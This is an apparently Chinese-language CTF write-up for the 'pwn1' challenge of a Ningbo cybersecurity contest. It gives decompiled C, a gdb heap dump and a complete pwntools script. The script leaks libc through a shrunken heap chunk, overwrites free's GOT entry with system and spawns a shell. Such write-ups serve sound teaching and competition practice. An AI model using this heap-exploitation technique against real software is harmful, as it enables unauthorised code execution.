# 宁波市网络安全竞赛wp

## 初赛

### pwn1

这个题目主要的难点实在泄露libc中和没有远程环境的原因

我们可以先看一下题目

这个是一个addr

```c
int register_user()
{
  char *v1; // ebx
  char *v2; // ebx
  char src[16]; // [esp+4h] [ebp-24h] BYREF
  int v4; // [esp+14h] [ebp-14h]
  int user; // [esp+18h] [ebp-10h]
  int i; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i <= 15 && (&user_db)[i]; ++i )
    ;
  if ( i > 15 )
    return puts("Max user count reached");
  printf("New username: ");
  read_buff(src, 16);
  user = find_user(src);
  if ( user != -1 )
    return puts("Username already exists");
  user = alloc_user();
  if ( user == -1 )
    return puts("No available user slot");
  (&user_db)[user] = (char *)malloc(0x1Cu);
  strcpy((&user_db)[user], src);
  printf("User [%s] created\n", src);
  v4 = 0;
  printf("Privilege level (1-999): ");
  v4 = read_int();
  if ( v4 > 0 && v4 <= 999 )
    *((_DWORD *)(&user_db)[user] + 4) = v4;
  *((_DWORD *)(&user_db)[user] + 5) = 0;
  while ( *((int *)(&user_db)[user] + 5) <= 0 || *((int *)(&user_db)[user] + 5) > 256 )
  {
    printf("Description length: ");
    v1 = (&user_db)[user];
    *((_DWORD *)v1 + 5) = read_int();
  }
  v2 = (&user_db)[user];
  *((_DWORD *)v2 + 6) = malloc(*((_DWORD *)v2 + 5));
  printf("Description: ");
  return read_buff(*((_DWORD *)(&user_db)[user] + 6), *((_DWORD *)(&user_db)[user] + 5));
}
```



这里是free

```c
int remove_user()
{
  int v1; // [esp+Ch] [ebp-Ch]

  v1 = select_user();
  if ( v1 == -1 )
    return puts("User not found");
  else
    return destroy_user(v1);
}

int __cdecl destroy_user(int a1)
{
  int result; // eax

  if ( (&user_db)[a1] )
  {
    *((_DWORD *)(&user_db)[a1] + 4) = 0;
    free(*((void **)(&user_db)[a1] + 6));
    free((&user_db)[a1]); 
  }
  result = a1;
  (&user_db)[a1] = 0;
  return result;
}
```



这里是一个list，输出

```c
int list_users()
{
  const char *v0; // esi
  int v1; // ebx
  const char *v2; // edi
  size_t v3; // eax
  int v4; // ebx
  const char *v5; // esi
  size_t v6; // eax
  const void *v7; // ebx
  size_t v8; // eax
  size_t v9; // eax
  char s[785]; // [esp+Bh] [ebp-32Dh] BYREF
  int i; // [esp+31Ch] [ebp-1Ch]

  memset(s, 0, sizeof(s));
  for ( i = 0; i <= 15; ++i )
  {
    if ( (&user_db)[i] )
    {
      if ( strlen(*((const char **)(&user_db)[i] + 6)) > 0x10 )
      {
        v4 = *((_DWORD *)(&user_db)[i] + 4);
        v5 = (&user_db)[i];
        v6 = strlen(s);
        sprintf(&s[v6], "%s: privilege.%d, desc.", v5, v4);
        v7 = (const void *)*((_DWORD *)(&user_db)[i] + 6);
        v8 = strlen(s);
        memcpy(&s[v8], v7, 0xDu);
        v9 = strlen(s);
        memcpy(&s[v9], "...\n", 4u);
      }
      else
      {
        v0 = (const char *)*((_DWORD *)(&user_db)[i] + 6);
        v1 = *((_DWORD *)(&user_db)[i] + 4);
        v2 = (&user_db)[i];
        v3 = strlen(s);
        sprintf(&s[v3], "%s: privilege.%d, desc.%s\n", v2, v1, v0);
      }
    }
  }
  puts("Registered Users:");
  return puts(s);
}
```



adjust函数

```c
int adjust_privilege()
{
  int result; // eax
  int v1; // [esp+8h] [ebp-10h]
  int v2; // [esp+Ch] [ebp-Ch]

  v2 = select_user();
  if ( v2 == -1 )
    return puts("User not found");
  if ( *((int *)(&user_db)[v2] + 4) <= 0 || *((int *)(&user_db)[v2] + 4) > 999 )
    return puts("Invalid privilege range");
  printf("Adjust privilege by: ");
  v1 = read_int();
  if ( v1 < -20 || v1 > 20 )
    return puts("Adjustment denied");
  *((_DWORD *)(&user_db)[v2] + 4) += v1;
  if ( *((int *)(&user_db)[v2] + 4) <= 0 || (result = *((_DWORD *)(&user_db)[v2] + 4), result > 999) )
  {
    puts("Privilege out of bounds. User removed.");
    return destroy_user(v2);
  }
  return result;
}
```



edit

```c
int edit_description()
{
  int v1; // [esp+8h] [ebp-10h]
  int size; // [esp+Ch] [ebp-Ch]

  v1 = select_user();
  if ( v1 == -1 )
    return puts("User not found");
  for ( size = 0; size <= 0 || size > 256; size = read_int() )
    printf("New description size: ");
  if ( *((_DWORD *)(&user_db)[v1] + 5) != size )
    realloc(*((void **)(&user_db)[v1] + 6), size);
  printf("New description: ");
  return read_buff(*((_DWORD *)(&user_db)[v1] + 6), *((_DWORD *)(&user_db)[v1] + 5));
}
```



主要的思路：

1.通过改小来泄露libc

2.修改free的got表为system

先看一下啊gdb

```tex
0x9336000	0x00000000	0x00000021	....!...
0x9336008	0x30303030	0x30303030	00000000
0x9336010	0x30303030	0x00303030	0000000.
0x9336018	0x00000000	0x00000054	....T...
0x9336020	0x09336028	0x00000011	(`3.....
0x9336028	0x61616161	0x61616161	aaaaaaaa
0x9336030	0x61616161	0x000000d8	aaaa....	 <-- unsortedbin[all][0]
0x9336038	0xf073b7b0	0xf073b7b0	..s...s.
0x9336040	0x00000000	0x00000000	........
0x9336048	0x00000000	0x00000000	........
0x9336050	0x00000000	0x00000000	........
0x9336058	0x00000000	0x00000000	........
0x9336060	0x00000000	0x00000000	........
0x9336068	0x00000000	0x00000000	........
0x9336070	0x00000000	0x00000000	........
0x9336078	0x00000048	0x00000020	H... ...
0x9336080	0x31313131	0x31313131	11111111
0x9336088	0x31313131	0x00313131	1111111.
0x9336090	0x00000000	0x00000044	....D...
0x9336098	0x093360a0	0x00000049	.`3.I...
0x93360a0	0x62626262	0x00000000	bbbb....
0x93360a8	0x00000000	0x00000000	........
0x93360b0	0x00000000	0x00000000	........
0x93360b8	0x00000000	0x00000000	........
0x93360c0	0x00000000	0x00000000	........
0x93360c8	0x00000000	0x00000000	........
0x93360d0	0x00000000	0x00000000	........
0x93360d8	0x00000000	0x00000000	........
0x93360e0	0x00000000	0x00000021	....!...
0x93360e8	0x32323232	0x32323232	22222222
0x93360f0	0x32323232	0x00323232	2222222.
0x93360f8	0x00000000	0x00000044	....D...
0x9336100	0x09336108	0x00000049	.a3.I...
0x9336108	0x000000d8	0x00000040	....@...
0x9336110	0x00000000	0x00000000	........
0x9336118	0x00000000	0x00000000	........
0x9336120	0x00000000	0x00000000	........
0x9336128	0x00000000	0x00000000	........
0x9336130	0x00000000	0x00000000	........
0x9336138	0x00000000	0x00000000	........
0x9336140	0x00000000	0x00000000	........
0x9336148	0x00000000	0x00000021	....!...
0x9336150	0x33333333	0x33333333	33333333
0x9336158	0x33333333	0x00333333	3333333.
0x9336160	0x00000000	0x00000044	....D...
0x9336168	0x09336170	0x00000049	pa3.I...
0x9336170	0x6e69622f	0x0068732f	/bin/sh.
0x9336178	0x00000000	0x00000000	........
0x9336180	0x00000000	0x00000000	........
0x9336188	0x00000000	0x00000000	........
0x9336190	0x00000000	0x00000000	........
0x9336198	0x00000000	0x00000000	........
0x93361a0	0x00000000	0x00000000	........
0x93361a8	0x00000000	0x00000000	........
0x93361b0	0x00000000	0x00020e51	....Q...	 <-- Top chunk
通过这个gdb在chunk提前布局了，我们在上面的文件中知道我们的写入一个小的size的时候会改小这个chunk，到那时我们的chunk还是可以在读取中写了的，并且他的控制块中并不会改变因此这里就可以直接去修改他的大小来修改他的覆盖范围来控制这样当我重新申请的时候就可以直接对这个块进行切割，然后让libc数据放入到下一个控制块中去，使得它可以被我们绕过\x00截断
```



```py
from pwn import *
context(os='linux',log_level = 'debug',arch='i386')
# io=remote('node5.anna.nssctf.cn',22565)
io= process("/home/fofa/smartdoor")
elf=ELF("/home/fofa/smartdoor")
libc=ELF('/home/fofa/桌面/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6')

def add(name,level,size,content):
    io.sendlineafter("Your choice >> ", "1")
    io.sendlineafter("New username: ", name)
    io.sendlineafter("Privilege level (1-999): ", str(level))
    io.sendlineafter("Description length: ", str(size))
    io.sendlineafter("Description: ", content)

def edit_p(name,level):
    io.sendlineafter(">> ", "4")
    io.sendlineafter("Username: ", name)
    io.sendlineafter("Adjust privilege by: ", str(level))

def edit(name,size,content):
    io.sendlineafter(">> ", "5")
    io.sendlineafter("Username: ", name)
    io.sendlineafter("New description size: ", str(size))
    io.sendlineafter("New description: ", content)

def delete(name):
    io.sendlineafter("Your choice >> ", "2")
    io.sendlineafter("Username: ", name)

def show():
    io.sendlineafter("Your choice >> ", "3")

add('0'*15,666,0x54,'aaaa')
add('1'*15,666,0x44,'bbbb')
add('2'*15,666,0x44,p32(0xd8)+p8(0x40))
add('3'*15,666,0x44,'/bin/sh')

edit('0'*15,0x4,b'a'*12+p8(0xd8))
gdb.attach(io)
delete('0'*15)

add('0'*15,666,0x44,'c'*4)
# gdb.attach(io)
# pause()
show()
# gdb.attach(io)
io.recvuntil('c'*4+'\x0a')
libc_base = u32(io.recv(4))- 0x1b37b0
log.success('libc base: '+hex(libc_base))
system = libc_base + libc.sym['system']

free_got=elf.got['free']
log.success('free got: '+hex(free_got))
add('4'*15,666,0x6c,b'c'*0x44+p32(0x21)+b'\x32'*16+p32(0)+p32(0x44)+p32(free_got)+b'\x49')

edit('2'*16,0x44,p32(system))
delete('3'*15)

io.interactive()
```

---

## 决赛

